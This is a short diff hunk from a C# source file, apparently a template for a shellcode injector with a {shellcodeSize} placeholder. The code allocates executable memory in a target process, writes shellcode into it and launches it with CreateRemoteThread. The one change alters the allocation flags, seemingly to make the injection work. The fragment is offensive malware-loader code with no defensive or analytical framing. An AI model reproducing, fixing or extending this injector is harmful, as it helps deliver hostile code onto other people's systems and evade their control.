@@ -131,7 +131,7 @@ namespace ClassLibrary1
             IntPtr bytesWritten;
             IntPtr threadId;
 
-            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x1000, 0x20);
+            IntPtr pRemoteCode = VirtualAllocEx(pi.hProcess, IntPtr.Zero, {shellcodeSize}, 0x3000, 0x20);
             WriteProcessMemory(pi.hProcess, pRemoteCode, shellcode, {shellcodeSize}, out bytesWritten);
             IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, pRemoteCode, IntPtr.Zero, 0, out threadId);
             WaitForSingleObject(hThread, 500);
